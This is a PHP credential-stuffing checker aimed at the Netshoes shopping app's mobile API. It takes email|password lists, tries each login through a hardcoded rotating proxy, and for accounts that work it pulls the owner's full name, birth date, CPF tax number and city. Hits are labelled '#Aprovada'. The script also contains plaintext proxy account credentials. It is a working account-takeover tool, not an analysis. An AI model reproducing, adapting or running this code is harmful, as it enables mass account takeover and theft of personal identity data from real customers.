
<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 
 
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
 
function getStr2($dado, $string, $string2){ // FUNCTION QUE PUXA UM VALOR INDEFINIDO ENTRE DUAS STRINGS QUE NรO MUDAM.
  preg_match_all("($string(.*)$string2)siU", $dado, $match1);
  return $match1[1][0];
 
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email  = $separar[0];
$senha = $separar[1];
 
 
$username = 'blue3419ankj16047'; 
$password = 'ku9VsvUjT7gv7oOx_country-Brazil'; 
$proxy = 'isp2.hydraproxy.com:9989';

$random = rand(1000, 100000000); 


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://prd-free-mobile-api.ns2online.com.br/f47dd6f/newlogin');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: prd-free-mobile-api.ns2online.com.br',
  'uuid: ',
  'version: 5.14.0',
  'Accept: */*',
  'user-device: iPhone de Vitor',
  'ga_traking: fcbbf4fc-a0c4-4026-bbc2-29bef5081eb0',
  'platform-version: 12.5.4',
  'Accept-Language: pt-br',
  'platform: iOS',
  'Accept-Encoding: gzip, deflate',
  'User-Agent: Netshoes App',
  'Connection: close',
  'Content-Type: application/json',
  'device: APP',
  'Cookie: campaignCode=nsappandroid01; view=a',
  'storeid: L_NETSHOES',
	));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
  "identifier" : "'.$email.'",
  "password" : "'.$senha.'"
}');
$d1 = curl_exec($ch);
$uuid = getStr($d1, '"uuid":"', '",');
$access_token = getStr($d1, '"access_token":"', '"');
$jti = getStr($d1, '"jti":"', '"');

$retorno = getStr($d1, '"message":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://prd-free-mobile-api.ns2online.com.br/customers/secure/me');  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: prd-free-mobile-api.ns2online.com.br',
  'uuid: '.$uuid.'',
  'Authorization: bearer '.$access_token.'',
  'version: 5.14.0',
  'Accept: */*',
  'user-device: iPhone de Vitor',
  'ga_traking: fcbbf4fc-a0c4-4026-bbc2-29bef5081eb0',
  'jti: '.$jti.'',
  'platform-version: 12.5.4',
  'Accept-Language: pt-br',
  'platform: iOS',
  'Accept-Encoding: gzip, deflate',
  'Content-Type: application/json',
  'User-Agent: Netshoes App',
  'Connection: close',
  'device: APP',
  'Cookie: campaignCode=nsappandroid01; view=a',
  'storeid: L_NETSHOES',
	));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d2 = curl_exec($ch);
$nome = getStr($d2, '"name":"', '"');
$sobrenome = getStr($d2, '"lastName":"', '"');
$nascimento = getStr($d2, '"dateOfBirth":"', '"');
$cpf = getStr($d2, '"number":"', '"');
$cidade = getStr($d2, '"city":"', '"');
$estado = getStr($d2, '"state":"', '"');




     if(stristr($d1,'access_token') !== false){
        echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$email.'|'.$senha.' → Nome: '.$nome.' '.$sobrenome.' | Nascimento: '.$nascimento.' | CPF: '.$cpf.' | Cidade: '.$cidade.'('.$estado.')   <strong></strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }
	
else{
        echo '              
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' Response: → '.$retorno.' <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
';

}

curl_close($ch);
 ob_flush();        
                             
?>
